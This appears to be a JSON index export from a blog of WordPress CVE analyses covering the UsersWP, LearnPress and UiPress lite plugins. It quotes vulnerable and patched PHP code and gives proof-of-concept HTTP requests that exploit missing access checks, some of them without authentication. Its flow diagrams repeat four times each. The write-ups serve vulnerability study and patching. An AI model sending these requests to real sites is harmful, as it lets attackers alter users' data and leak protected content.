","date":"2025-12-13","objectID":"/posts/2025-12-13-cve-2025-12174/:6:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-12174 Analysis \u0026 POC","uri":"/posts/2025-12-13-cve-2025-12174/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways Nonce is not a permission check: nonce only prevents CSRF, not unauthorized low-privileged actions. WordPress AJAX is a common attack surface: every wp_ajax_ must implement explicit capability checks. Broken Access Control often arises from a missing single line, not complex logic. Custom capability (like manage_atbdp_options) is effective for fine-grained permission control. Always validate both user authentication and permissions before allowing administrative actions. ","date":"2025-12-13","objectID":"/posts/2025-12-13-cve-2025-12174/:7:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-12174 Analysis \u0026 POC","uri":"/posts/2025-12-13-cve-2025-12174/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Broken Access Control WordPress Directorist Plugin \u003c= 8.5.2 is vulnerable to Broken Access Control ","date":"2025-12-13","objectID":"/posts/2025-12-13-cve-2025-12174/:8:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-12174 Analysis \u0026 POC","uri":"/posts/2025-12-13-cve-2025-12174/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress UsersWP Plugin.","date":"2025-12-12","objectID":"/posts/2025-12-12-cve-2025-66072/","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-66072 Analysis \u0026 POC","uri":"/posts/2025-12-12-cve-2025-66072/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The Missing Authorization vulnerability in Stiofan UsersWP allows exploitation of Incorrectly Configured Access Control Security Levels. This issue affects UsersWP: from n/a to \u003c= 1.2.47. CVE ID: CVE-2025-66072 Vulnerability Type: Broken Access Control Affected Versions: \u003c= 1.2.47 Patched Versions: 1.2.48 CVSS severity: Low (5.3) Required Privilege: Unauthenticated Product: WordPress UsersWP Plugin ","date":"2025-12-12","objectID":"/posts/2025-12-12-cve-2025-66072/:1:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-66072 Analysis \u0026 POC","uri":"/posts/2025-12-12-cve-2025-66072/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - UsersWP: 1.2.47 – vulnerable 1.2.48 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-12-12","objectID":"/posts/2025-12-12-cve-2025-66072/:2:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-66072 Analysis \u0026 POC","uri":"/posts/2025-12-12-cve-2025-66072/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The plugin registers an action hook: class-admin.php add_action( 'admin_init', array( $this, 'handle_bulk_user_type_change' ) ); admin_init runs whenever any logged-in user accesses the admin dashboard (/wp-admin/), but it is also triggered in endpoints like admin-ajax.php and admin-post.php. Because these endpoints are accessible by unauthenticated users, in some conditions, an unauthenticated user can trigger admin_init even without visiting the admin dashboard. This means that any user sending a request to admin-ajax.php or admin-post.php will trigger the admin_init hook, which in turn calls the handle_bulk_user_type_change callback. class-admin.php v1.2.47 public function handle_bulk_user_type_change() { if ( ! isset( $_GET['uwp_change_user_type'], $_GET['uwp_new_user_type'] ) ) { return; } $new_user_type = absint( $_GET['uwp_new_user_type'] ); if ( ! $new_user_type ) { return; } $users = isset( $_REQUEST['users'] ) \u0026\u0026 ! empty( $_REQUEST['users'] ) ? (array) $_REQUEST['users'] : array(); if ( ! empty( $users ) ) { array_map( function( $user_id ) use ( $new_user_type ) { update_user_meta( absint( $user_id ), '_uwp_register_form_id', (int) $new_user_type ); }, $users ); } wp_safe_redirect( add_query_arg( 'user_type_updated', 'true', admin_url( 'users.php' ) ) ); exit; } The function checks whether the request contains uwp_change_user_type and uwp_new_user_type; if not, it exits. If present, it retrieves uwp_new_user_type from $_GET and converts it to a positive integer. If the value is invalid, the function exits. Next, it retrieves the users list from $_REQUEST['users']. If the array is not empty, it executes update_user_meta() for each user, updating _uwp_register_form_id with $new_user_type. Finally, it redirects to users.php with user_type_updated=true and ends execution. User Type List Bug The vulnerability occurs due to the lack of any capability/permission checks. This allows any user—including non-admin users—to call the endpoint and change the User Type of any user, even though this action should be restricted to admins. Patch (v1.2.48): adds to the handle_bulk_user_type_change function: Nonce verification: The function requires _wpnonce to exist and be valid for the 'bulk-users' action. class-admin.php v1.2.48 if ( ! isset( $_GET['_wpnonce'] ) || ! wp_verify_nonce( $_GET['_wpnonce'], 'bulk-users' ) ) { wp_die( __( 'Security check failed. Please try again.' ) ); } Capability check: Only users with the edit_users capability are allowed to perform this action. class-admin.php v1.2.48 if ( ! current_user_can( 'edit_users' ) ) { wp_die( __( 'You do not have permission to perform this action.' ) ); } Diff code ","date":"2025-12-12","objectID":"/posts/2025-12-12-cve-2025-66072/:3:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-66072 Analysis \u0026 POC","uri":"/posts/2025-12-12-cve-2025-66072/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"Any user (including Unauthenticated)\"] --\u003e B[\"Send request to admin-ajax.php or admin-post.php with uwp_change_user_type + uwp_new_user_type\"] B --\u003e C[\"Hook admin_init is triggered\"] C --\u003e D[\"Callback handle_bulk_user_type_change() executes\"] D --\u003e E{\"Are required GET parameters present?\"} E -- No --\u003e F[\"Function exits\"] E -- Yes --\u003e G[\"Retrieve uwp_new_user_type from $_GET\"] G --\u003e H{\"Is uwp_new_user_type a valid integer?\"} H -- No --\u003e F H -- Yes --\u003e I[\"Retrieve users list from $_REQUEST['users']\"] I --\u003e J{\"Is users list not empty?\"} J -- No --\u003e F J -- Yes --\u003e K[\"update_user_meta() for each user in the list\"] K --\u003e L[\"Redirect to users.php?user_type_updated=true\"] L --\u003e M[\"User Type changed without any capability check\"] graph TD A[\"Any user (including Unauthenticated)\"] --\u003e B[\"Send request to admin-ajax.php or admin-post.php with uwp_change_user_type + uwp_new_user_type\"] B --\u003e C[\"Hook admin_init is triggered\"] C --\u003e D[\"Callback handle_bulk_user_type_change() executes\"] D --\u003e E{\"Are required GET parameters present?\"} E -- No --\u003e F[\"Function exits\"] E -- Yes --\u003e G[\"Retrieve uwp_new_user_type from $_GET\"] G --\u003e H{\"Is uwp_new_user_type a valid integer?\"} H -- No --\u003e F H -- Yes --\u003e I[\"Retrieve users list from $_REQUEST['users']\"] I --\u003e J{\"Is users list not empty?\"} J -- No --\u003e F J -- Yes --\u003e K[\"update_user_meta() for each user in the list\"] K --\u003e L[\"Redirect to users.php?user_type_updated=true\"] L --\u003e M[\"User Type changed without any capability check\"] graph TD A[\"Any user (including Unauthenticated)\"] --\u003e B[\"Send request to admin-ajax.php or admin-post.php with uwp_change_user_type + uwp_new_user_type\"] B --\u003e C[\"Hook admin_init is triggered\"] C --\u003e D[\"Callback handle_bulk_user_type_change() executes\"] D --\u003e E{\"Are required GET parameters present?\"} E -- No --\u003e F[\"Function exits\"] E -- Yes --\u003e G[\"Retrieve uwp_new_user_type from $_GET\"] G --\u003e H{\"Is uwp_new_user_type a valid integer?\"} H -- No --\u003e F H -- Yes --\u003e I[\"Retrieve users list from $_REQUEST['users']\"] I --\u003e J{\"Is users list not empty?\"} J -- No --\u003e F J -- Yes --\u003e K[\"update_user_meta() for each user in the list\"] K --\u003e L[\"Redirect to users.php?user_type_updated=true\"] L --\u003e M[\"User Type changed without any capability check\"] graph TD A[\"Any user (including Unauthenticated)\"] --\u003e B[\"Send request to admin-ajax.php or admin-post.php with uwp_change_user_type + uwp_new_user_type\"] B --\u003e C[\"Hook admin_init is triggered\"] C --\u003e D[\"Callback handle_bulk_user_type_change() executes\"] D --\u003e E{\"Are required GET parameters present?\"} E -- No --\u003e F[\"Function exits\"] E -- Yes --\u003e G[\"Retrieve uwp_new_user_type from $_GET\"] G --\u003e H{\"Is uwp_new_user_type a valid integer?\"} H -- No --\u003e F H -- Yes --\u003e I[\"Retrieve users list from $_REQUEST['users']\"] I --\u003e J{\"Is users list not empty?\"} J -- No --\u003e F J -- Yes --\u003e K[\"update_user_meta() for each user in the list\"] K --\u003e L[\"Redirect to users.php?user_type_updated=true\"] L --\u003e M[\"User Type changed without any capability check\"] ","date":"2025-12-12","objectID":"/posts/2025-12-12-cve-2025-66072/:4:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-66072 Analysis \u0026 POC","uri":"/posts/2025-12-12-cve-2025-66072/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Send a request as an unauthenticated user: GET /wp-admin/admin-post.php?uwp_change_user_type=2\u0026uwp_new_user_type=user_type_id\u0026users[]=uid_1\u0026users[]=uid_2 HTTP/1.1 Host: localhost ","date":"2025-12-12","objectID":"/posts/2025-12-12-cve-2025-66072/:5:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-66072 Analysis \u0026 POC","uri":"/posts/2025-12-12-cve-2025-66072/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion CVE-2025-66072 arises from the lack of authorization checks in the handle_bulk_user_type_change() function of UsersWP \u003c= 1.2.47. This allows any user, including unauthenticated users, to change the User Type of other users by sending crafted requests to admin-ajax.php or admin-post.php. The patch in version 1.2.48 mitigates the issue by enforcing nonce verification and capability checks, restricting the action to authorized users only. ","date":"2025-12-12","objectID":"/posts/2025-12-12-cve-2025-66072/:6:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-66072 Analysis \u0026 POC","uri":"/posts/2025-12-12-cve-2025-66072/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways Always perform capability checks (current_user_can) when handling sensitive actions in WordPress. Use nonces to prevent unauthorized or forged requests. Do not rely solely on hooks like admin_init; ensure all public endpoints validate both permissions and request authenticity. Low-privileged or unauthenticated users can exploit endpoints if proper access control is missing. ","date":"2025-12-12","objectID":"/posts/2025-12-12-cve-2025-66072/:7:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-66072 Analysis \u0026 POC","uri":"/posts/2025-12-12-cve-2025-66072/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Broken Access Control WordPress UsersWP Plugin \u003c= 1.2.47 is vulnerable to Broken Access Control ","date":"2025-12-12","objectID":"/posts/2025-12-12-cve-2025-66072/:8:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-66072 Analysis \u0026 POC","uri":"/posts/2025-12-12-cve-2025-66072/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress LearnPress Plugin.","date":"2025-12-11","objectID":"/posts/2025-12-11-cve-2025-11368/","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-11368 Analysis \u0026 POC","uri":"/posts/2025-12-11-cve-2025-11368/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The LearnPress – WordPress LMS Plugin for WordPress contains a Sensitive Information Disclosure vulnerability in all versions up to and including 4.2.9.4. The cause is the lack of capability checks in the REST endpoint /wp-json/lp/v1/load_content_via_ajax, which allows execution of arbitrary callbacks belonging to admin-only template methods. This enables unauthenticated attackers to obtain admin curriculum HTML, quiz questions with correct answers, course materials, and other sensitive educational content via the REST API endpoint, as long as they supply valid numeric IDs. CVE ID: CVE-2025-11368 Vulnerability Type: Broken Access Control Affected Versions: \u003c= 4.2.9.4 Patched Versions: 4.3.0 CVSS severity: Low (5.3) Required Privilege: Unauthenticated Product: WordPress LearnPress Plugin ","date":"2025-12-11","objectID":"/posts/2025-12-11-cve-2025-11368/:1:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-11368 Analysis \u0026 POC","uri":"/posts/2025-12-11-cve-2025-11368/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version – LearnPress: 4.2.9.4 – vulnerable 4.3.0 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-12-11","objectID":"/posts/2025-12-11-cve-2025-11368/:2:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-11368 Analysis \u0026 POC","uri":"/posts/2025-12-11-cve-2025-11368/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The plugin registers a REST API: class-lp-rest-ajax-controller.php v4.2.9.4 class LP_REST_AJAX_Controller extends LP_Abstract_REST_Controller { public function __construct() { $this-\u003enamespace = 'lp/v1'; $this-\u003erest_base = 'load_content_via_ajax'; parent::__construct(); } public function register_routes() { $this-\u003eroutes = array( '/' =\u003e array( array( 'methods' =\u003e WP_REST_Server::ALLMETHODS, 'callback' =\u003e array( $this, 'get_content' ), 'permission_callback' =\u003e '__return_true', ), ), ); parent::register_routes(); } ... } In the code above, class LP_REST_AJAX_Controller extends LP_Abstract_REST_Controller and is used to register a REST API endpoint for the LearnPress plugin. __construct(): Sets the namespace to lp/v1. Sets the rest_base to load_content_via_ajax. Calls parent::__construct() to inherit the parent class setup. register_routes(): Declares a route / with the following: methods: accepts all HTTP methods (WP_REST_Server::ALLMETHODS). callback: calls the get_content function. permission_callback: always returns true, meaning no permission checks. Calls parent::register_routes() to complete registration. abstract-rest-controller.php v4.2.9.4 public function register_routes() { if ( ! $this-\u003eroutes ) { return; } foreach ( $this-\u003eroutes as $key =\u003e $args ) { $rest_base = $this-\u003erest_base; $override = false; if ( is_bool( end( $args ) ) ) { $override = array_pop( $args ); } if ( ! is_numeric( $key ) ) { $rest_base = \"{$rest_base}/{$key}\"; } register_rest_route( $this-\u003enamespace, '/' . $rest_base, $args, $override ); } } Thus, this API exposes the endpoint: /wp-json/lp/v1/load_content_via_ajax, and the get_content callback will be invoked when receiving a request. class-lp-rest-ajax-controller.php v4.2.9.4 public function get_content( WP_REST_Request $request ): LP_REST_Response { $response = new LP_REST_Response(); try { $params = $request-\u003eget_params(); if ( empty( $params['callback'] ) || ! isset( $params['args'] ) ) { throw new Exception( 'Error: params invalid!' ); } // @var array $args $args = $params['args']; $callBack = $params['callback']; if ( $request-\u003eget_method() === 'GET' ) { $args = LP_Helper::json_decode( $params['args'], true ); $callBack = LP_Helper::json_decode( $params['callback'], true ); } if ( empty( $callBack['class'] ) || empty( $callBack['method'] ) ) { throw new Exception( 'Error: callback invalid!' ); } $class = $callBack['class']; $method = $callBack['method']; $data = null; // Security: check callback is registered. $allow_callbacks = apply_filters( 'lp/rest/ajax/allow_callback', [] ); $callBackStr = $class . ':' . $method; if ( ! in_array( $callBackStr, $allow_callbacks ) ) { throw new Exception( 'Error: callback is not register!' ); } // Check class and method is callable. if ( is_callable( [ $class, $method ] ) ) { $data = call_user_func( [ $class, $method ], $args ); } else { throw new Exception( 'Error: callback is not callable!' ); } if ( ! $data instanceof stdClass \u0026\u0026 ! isset( $data-\u003econtent ) ) { throw new Exception( 'Error: data content invalid!' ); } $response-\u003estatus = 'success'; $response-\u003emessage = 'Success!'; $response-\u003edata = $data; } catch ( Throwable $e ) { $response-\u003estatus = 'error'; $response-\u003emessage = $e-\u003egetMessage(); } return $response; } The function receives callback and args from the request, decodes JSON if using GET, checks whether the callback contains both class and method, builds the string class:method and checks it against the valid callbacks list from the filter; if present, checks if class–method is callable and executes call_user_func with $args, receives $data, and returns it in the response. A series of callbacks are registered via add_filter for lp/rest/ajax/allow_callback: Register callbacks for filter lp/rest/ajax/allow_callback public function allow_callback( array $callbacks ): array { $callbacks[] = get_class( $this ) . ':render_edit_quiz'; $callbacks[] = get_class( $this ) . ':render_list_items_not_assign'; return $callbacks; } The function re","date":"2025-12-11","objectID":"/posts/2025-12-11-cve-2025-11368/:3:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-11368 Analysis \u0026 POC","uri":"/posts/2025-12-11-cve-2025-11368/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"Unauthenticated attacker\"] --\u003e B[\"Sends request to REST API: /wp-json/lp/v1/load_content_via_ajax\"] --\u003e C[\"Request includes callback (class + method) and args (lesson, quiz, material IDs...)\"] --\u003e D[\"API receives request → invokes get_content()\"] --\u003e E[\"permission_callback = __return_true → no capability checks\"] --\u003e F[\"get_content() validates params but performs no permission or capability validation\"] --\u003e G[\"Constructs class:method and verifies it against allowed callbacks via lp/rest/ajax/allow_callback\"] --\u003e H[\"Callback is valid but intended for admin-only template rendering\"] --\u003e I[\"API executes the method using call_user_func([class, method], args)\"] --\u003e J[\"Template method renders sensitive HTML such as curriculum, quiz content, answers, or course materials\"] --\u003e K[\"Sensitive data is returned to the attacker through the REST API\"] graph TD A[\"Unauthenticated attacker\"] --\u003e B[\"Sends request to REST API: /wp-json/lp/v1/load_content_via_ajax\"] --\u003e C[\"Request includes callback (class + method) and args (lesson, quiz, material IDs...)\"] --\u003e D[\"API receives request → invokes get_content()\"] --\u003e E[\"permission_callback = __return_true → no capability checks\"] --\u003e F[\"get_content() validates params but performs no permission or capability validation\"] --\u003e G[\"Constructs class:method and verifies it against allowed callbacks via lp/rest/ajax/allow_callback\"] --\u003e H[\"Callback is valid but intended for admin-only template rendering\"] --\u003e I[\"API executes the method using call_user_func([class, method], args)\"] --\u003e J[\"Template method renders sensitive HTML such as curriculum, quiz content, answers, or course materials\"] --\u003e K[\"Sensitive data is returned to the attacker through the REST API\"] graph TD A[\"Unauthenticated attacker\"] --\u003e B[\"Sends request to REST API: /wp-json/lp/v1/load_content_via_ajax\"] --\u003e C[\"Request includes callback (class + method) and args (lesson, quiz, material IDs...)\"] --\u003e D[\"API receives request → invokes get_content()\"] --\u003e E[\"permission_callback = __return_true → no capability checks\"] --\u003e F[\"get_content() validates params but performs no permission or capability validation\"] --\u003e G[\"Constructs class:method and verifies it against allowed callbacks via lp/rest/ajax/allow_callback\"] --\u003e H[\"Callback is valid but intended for admin-only template rendering\"] --\u003e I[\"API executes the method using call_user_func([class, method], args)\"] --\u003e J[\"Template method renders sensitive HTML such as curriculum, quiz content, answers, or course materials\"] --\u003e K[\"Sensitive data is returned to the attacker through the REST API\"] graph TD A[\"Unauthenticated attacker\"] --\u003e B[\"Sends request to REST API: /wp-json/lp/v1/load_content_via_ajax\"] --\u003e C[\"Request includes callback (class + method) and args (lesson, quiz, material IDs...)\"] --\u003e D[\"API receives request → invokes get_content()\"] --\u003e E[\"permission_callback = __return_true → no capability checks\"] --\u003e F[\"get_content() validates params but performs no permission or capability validation\"] --\u003e G[\"Constructs class:method and verifies it against allowed callbacks via lp/rest/ajax/allow_callback\"] --\u003e H[\"Callback is valid but intended for admin-only template rendering\"] --\u003e I[\"API executes the method using call_user_func([class, method], args)\"] --\u003e J[\"Template method renders sensitive HTML such as curriculum, quiz content, answers, or course materials\"] --\u003e K[\"Sensitive data is returned to the attacker through the REST API\"] ","date":"2025-12-11","objectID":"/posts/2025-12-11-cve-2025-11368/:4:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-11368 Analysis \u0026 POC","uri":"/posts/2025-12-11-cve-2025-11368/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Send a request as an unauthenticated user: POST /wp-json/lp/v1/load_content_via_ajax HTTP/1.1 Host: localhost ... callback[class]=LearnPress\\TemplateHooks\\Admin\\AdminEditQizTemplate\u0026callback[method]=render_list_items_not_assign\u0026args[quiz_id]=483 Result List of other allowed callbacks: LearnPress\\TemplateHooks\\Course\\ListCoursesTemplate:render_courses LearnPress\\TemplateHooks\\Course\\ListCoursesRelatedTemplate:render_courses LearnPress\\TemplateHooks\\Course\\SingleCourseTemplate:render_html_comments LearnPress\\TemplateHooks\\Profile\\ProfileQuizzesTemplate:renderContent LearnPress\\TemplateHooks\\Course\\AdminEditCurriculumTemplate:render_edit_course_curriculum LearnPress\\TemplateHooks\\Course\\AdminEditCurriculumTemplate:render_list_items_not_assign LearnPress\\TemplateHooks\\Admin\\AdminEditQizTemplate:render_edit_quiz LearnPress\\TemplateHooks\\Admin\\AdminEditQizTemplate:render_list_items_not_assign LearnPress\\TemplateHooks\\Admin\\AdminEditQuestionTemplate:render_edit_question LearnPress\\TemplateHooks\\Course\\CourseMaterialTemplate:render_material_items LearnPress\\ExternalPlugin\\Elementor\\Widgets\\Course\\Skins\\CoursesGrid:render_courses LearnPress\\ExternalPlugin\\Elementor\\Widgets\\Course\\Skins\\CoursesList:render_courses LearnPress\\ExternalPlugin\\Elementor\\Widgets\\Course\\Skins\\CoursesLoopItem:render_courses LearnPress\\Gutenberg\\Blocks\\Courses\\ListCoursesBlockType:render_courses ","date":"2025-12-11","objectID":"/posts/2025-12-11-cve-2025-11368/:5:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-11368 Analysis \u0026 POC","uri":"/posts/2025-12-11-cve-2025-11368/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The vulnerability stems from a REST API endpoint without access control, allowing unauthenticated attackers to execute internal admin-only callbacks. Using valid IDs, attackers can extract curriculum, quizzes, answers, and other sensitive course content. The 4.3.0 patch resolves this by adding X-WP-Nonce verification to prevent unauthorized access. ","date":"2025-12-11","objectID":"/posts/2025-12-11-cve-2025-11368/:6:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-11368 Analysis \u0026 POC","uri":"/posts/2025-12-11-cve-2025-11368/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways permission_callback = __return_true is the root cause of the Broken Access Control issue. Allowing execution of internal callbacks without permissions leads directly to sensitive data leaks. LearnPress admin templates were unintentionally exposed through a public REST API. The effective fix is adding wp_verify_nonce and enforcing capability restrictions. WordPress REST APIs must always implement capability checks when handling sensitive operations. ","date":"2025-12-11","objectID":"/posts/2025-12-11-cve-2025-11368/:7:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-11368 Analysis \u0026 POC","uri":"/posts/2025-12-11-cve-2025-11368/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Broken Access Control WordPress LearnPress Plugin \u003c= 4.2.9.4 is vulnerable to Broken Access Control ","date":"2025-12-11","objectID":"/posts/2025-12-11-cve-2025-11368/:8:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-11368 Analysis \u0026 POC","uri":"/posts/2025-12-11-cve-2025-11368/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress UiPress lite Plugin.","date":"2025-12-10","objectID":"/posts/2025-12-10-cve-2025-11815/","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-11815 Analysis \u0026 POC","uri":"/posts/2025-12-10-cve-2025-11815/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info UiPress lite | the plugin that creates custom dashboards, admin themes, and pages for WordPress is easily exploitable, leading to unauthorized data modification due to the lack of capability checks in the uip_save_site_option() function in all versions up to and including 3.5.08. This allows an authenticated attacker with Subscriber-level privileges or higher to arbitrarily modify plugin settings. Other AJAX actions are also affected. CVE ID: CVE-2025-11815 Vulnerability Type: Broken Access Control Affected Versions: \u003c= 3.5.08 Patched Versions: 3.5.09 CVSS severity: Low (5.4) Required Privilege: Subscriber Product: WordPress UiPress lite Plugin ","date":"2025-12-10","objectID":"/posts/2025-12-10-cve-2025-11815/:1:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-11815 Analysis \u0026 POC","uri":"/posts/2025-12-10-cve-2025-11815/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - UiPress lite: 3.5.08 – vulnerable 3.5.09 – patched Diff Tool (diff) → Meld or any other diff tool. ","date":"2025-12-10","objectID":"/posts/2025-12-10-cve-2025-11815/:2:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-11815 Analysis \u0026 POC","uri":"/posts/2025-12-10-cve-2025-11815/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The plugin registers a long list of AJAX actions: ajax-functions.php public function load_ajax() { $function_names = [ \"uip_get_users_and_roles\", \"uip_get_post_types\", \"uip_get_recent_posts\", \"uip_get_posts_for_table\", \"uip_get_post_table_columns\", \"uip_delete_post\", \"uip_save_user_preference\", \"uip_get_user_preference\", \"uip_search_content\", \"uip_process_form_input\", \"uip_send_form_email\", \"uip_save_form_as_option\", \"uip_save_form_as_user_option\", \"uip_pre_populate_form_data\", \"uip_create_frame_switch\", \"uip_get_sync_options\", \"uip_refresh_sync_key\", \"uip_save_sync_options\", \"uip_start_site_sync\", \"uip_check_for_template_updates\", \"uip_process_block_query\", \"uip_save_site_option\", \"uip_send_message_to_gpt\", \"uip_global_export\", \"uip_global_import\", \"uip_push_new_custom_menu_items\", \"uip_remove_custom_menu_items\", ]; foreach ($function_names as $name) { add_action(\"wp_ajax_{$name}\", [$this, $name]); } } The wp_ajax_ prefix indicates that these AJAX actions only run for logged-in users. In the vulnerable v3.5.08, none of the callbacks perform capability checks. For example: ajax-functions.php v3.5.08 public function uip_save_site_option() { Ajax::check_referer(); $option = json_decode(stripslashes($_POST[\"option\"])); $option = Sanitize::clean_input_with_code($option); $optionName = sanitize_text_field($_POST[\"optionName\"]); if (!$optionName) { Ajax::error(__(\"No option name specified\", \"uipress-lite\")); } UipOptions::update($optionName, $option); $returndata[\"success\"] = true; $returndata[\"message\"] = __(\"Option saved\", \"uipress-lite\"); wp_send_json($returndata); } This function updates the uip-global-settings option in the database using option and optionName taken directly from the POST request. UipOptions.php v3.5.08 public static function update($key = null, $newValue = false) { $options = get_option(\"uip-global-settings\"); $options = $options ? $options : []; if (isset($key)) { $options[$key] = $newValue; } else { $options = $newValue; } update_option(\"uip-global-settings\", $options); } This option is stored in the wp_options table with option_name = 'uip-global-settings': mysql\u003e select * from wp_options where option_name='uip-global-settings'; +-----------+---------------------+------------------------------------------------------------------------------+----------+ | option_id | option_name | option_value | autoload | +-----------+---------------------+------------------------------------------------------------------------------+----------+ | 363 | uip-global-settings | a:1:{s:11:\"remote-sync\";a:1:{s:3:\"key\";s:27:\"uip-692c7c8dd99844.95568294\";}} | auto | +-----------+---------------------+------------------------------------------------------------------------------+----------+ 1 row in set (0.00 sec) Although Ajax::check_referer() enforces CSRF protection using a security nonce: Ajax.php v3.5.08 public static function check_referer() { $doingAjax = defined(\"DOING_AJAX\") \u0026\u0026 DOING_AJAX; $referer = check_ajax_referer(\"uip-security-nonce\", \"security\") \u003e 0; $result = $doingAjax \u0026\u0026 $referer; if (!$result) { self::error(__(\"Unable to perform action\", \"uipress-lite\")); } } This nonce appears in the Dashboard of every logged-in user, including Subscribers. However, the AJAX actions themselves are intended only for admin users. Nonce in admin Dashboard In the patch v3.5.09, the developer added capability checks: v3.5.09 public static function check_referer() { Ajax::check_referer(); if (!current_user_can(\"manage_options\")) { Ajax::error(__(\"You do not have permission to perform this action\", \"uipress-lite\")); } ... } manage_options is an administrator-level capability, so only admins can execute these AJAX actions. All AJAX callbacks registered above are now protected by the same mechanism in the patched version. ","date":"2025-12-10","objectID":"/posts/2025-12-10-cve-2025-11815/:3:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-11815 Analysis \u0026 POC","uri":"/posts/2025-12-10-cve-2025-11815/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"Authenticated user (Subscriber or higher)\"] --\u003e B[\"Dashboard renders → 'uip-security-nonce' is available to all logged-in users\"] --\u003e C[\"Attacker sends AJAX request: action=uip_save_site_option\"] --\u003e D[\"Hook triggered: wp_ajax_uip_save_site_option\"] --\u003e E[\"Ajax::check_referer() validates nonce — passes\"] --\u003e F[\"No capability check is performed\"] --\u003e G[\"uip_save_site_option() executes\"] --\u003e H[\"Reads POST parameters: optionName + option\"] --\u003e I[\"Calls UipOptions::update()\"] --\u003e J[\"update_option('uip-global-settings', attacker-controlled data)\"] --\u003e K[\"Plugin settings overwritten by a low-privileged user\"] graph TD A[\"Authenticated user (Subscriber or higher)\"] --\u003e B[\"Dashboard renders → 'uip-security-nonce' is available to all logged-in users\"] --\u003e C[\"Attacker sends AJAX request: action=uip_save_site_option\"] --\u003e D[\"Hook triggered: wp_ajax_uip_save_site_option\"] --\u003e E[\"Ajax::check_referer() validates nonce — passes\"] --\u003e F[\"No capability check is performed\"] --\u003e G[\"uip_save_site_option() executes\"] --\u003e H[\"Reads POST parameters: optionName + option\"] --\u003e I[\"Calls UipOptions::update()\"] --\u003e J[\"update_option('uip-global-settings', attacker-controlled data)\"] --\u003e K[\"Plugin settings overwritten by a low-privileged user\"] graph TD A[\"Authenticated user (Subscriber or higher)\"] --\u003e B[\"Dashboard renders → 'uip-security-nonce' is available to all logged-in users\"] --\u003e C[\"Attacker sends AJAX request: action=uip_save_site_option\"] --\u003e D[\"Hook triggered: wp_ajax_uip_save_site_option\"] --\u003e E[\"Ajax::check_referer() validates nonce — passes\"] --\u003e F[\"No capability check is performed\"] --\u003e G[\"uip_save_site_option() executes\"] --\u003e H[\"Reads POST parameters: optionName + option\"] --\u003e I[\"Calls UipOptions::update()\"] --\u003e J[\"update_option('uip-global-settings', attacker-controlled data)\"] --\u003e K[\"Plugin settings overwritten by a low-privileged user\"] graph TD A[\"Authenticated user (Subscriber or higher)\"] --\u003e B[\"Dashboard renders → 'uip-security-nonce' is available to all logged-in users\"] --\u003e C[\"Attacker sends AJAX request: action=uip_save_site_option\"] --\u003e D[\"Hook triggered: wp_ajax_uip_save_site_option\"] --\u003e E[\"Ajax::check_referer() validates nonce — passes\"] --\u003e F[\"No capability check is performed\"] --\u003e G[\"uip_save_site_option() executes\"] --\u003e H[\"Reads POST parameters: optionName + option\"] --\u003e I[\"Calls UipOptions::update()\"] --\u003e J[\"update_option('uip-global-settings', attacker-controlled data)\"] --\u003e K[\"Plugin settings overwritten by a low-privileged user\"] 